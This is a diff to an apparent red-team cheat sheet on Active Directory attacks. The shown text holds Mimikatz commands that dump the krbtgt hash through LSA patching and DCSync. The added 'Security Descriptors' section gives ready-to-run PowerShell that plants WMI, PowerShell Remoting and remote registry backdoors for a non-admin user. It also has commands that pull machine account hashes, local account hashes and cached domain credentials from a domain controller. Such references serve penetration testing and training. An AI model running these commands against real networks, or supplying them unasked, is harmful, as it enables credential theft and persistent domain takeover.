@@ -19,7 +19,7 @@ First we need to obtain the `krbtgt` hash:
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc.corp.local
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
 ```
-> **RedTeam Note**: Using DCSync option does not need code execution on the target DC. For that reason is more silent than dumping the LSA.
+> **RedTeam Note**: Using DCSync option does not need code execution on the target DC. For that reason is more silent than dumping the LSA. DCSync is a technique which allows an attacker to hijack the Domain Controller account and replicate data such as passwords of all domain controllers.
 
 After that we need to create the ticket.
 
@@ -391,3 +391,78 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
 ```
 So once we have obtained the hash NTLM of *any user* of the domain, `PassTheHash` or `Over-PassTheHash` attack can be executed.
+
+## Security Descriptors
+
+It is possible to modify Security Descriptors such as security information like owner, primary group, DACL and SACL of multiple remote access methods to allow access to non-admin users.
+
+It is a very useful backdoor mechanism but administrative privileges are required.
+
+Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL.
+
+`ace\_type;ace\_flags;rights;object_guid;inherit\_object\_guid;account\_sid`
+
+ACE for built-in administrators for WMI namespaces
+
+```powershell
+A;CI;CCDCLCSWRPWPRCWD;;;<SID>
+```
+
+### WMI
+
+ACLs can be modified to allow non-admin users access to securable objects with `Set-RemoteWMI.ps1`:
+
+```powershell
+Import-Module .\Set-RemoteWMI.ps1
+```
+```powershell
+Set-RemoteWMI -UserName user1 -Verbose
+Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -Credential Administrator -namespace 'root\cimv2' -Verbose
+```
+And to remove permissions:
+
+```powershell
+Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace 'root\cimv2' -Remove -Verbose
+```
+
+### PowerShell Remoting
+
+Something similar we can do it with PowerShell Remoting with the script `Set-RemotePSRemoting.ps1`.
+
+```powershell
+Import-Module .\Set-RemotePSRemoting.ps1
+
+Set-RemotePSRemoting -UserName user1 -Verbose
+Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Verbose
+Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Remove
+```
+
+### Remote Registry
+
+Using DAMP we can modify the registry with administrative privileges.
+
+On a remote machine with `Add-RemoteRegBackdoor.ps1` script.
+```powershell
+Import-Module .\Add-RemoteRegBackdoor.ps1
+Add-RemoteRegBackdoor -ComputerName dc01.corp.local -Trustee user1 -Verbose
+```
+After that we can execute some interesting attacks such as getting accounts and machines hashes.
+
+* Retrive machine account hash:
+```powershell
+Import-Module .\Get-RemoteMachineAccountHash
+Get-RemoteMachineAccountHash -ComputerName dc01.corp.local -Verbose
+```
+
+* Retrieve local account hash:
+```powershell
+Import-Module .\Get-RemoteLocalAccountHash
+Get-RemoteLocalAccountHash -ComputerName dc01.corp.local -Verbose
+```
+
+* Retrive domain cached credentials:
+```powershell
+Import-Module .\Get-RemoteCachedCredentials
+Get-RemoteCachedCredentials -ComputerName dc01.corp.local -Verbose
+```
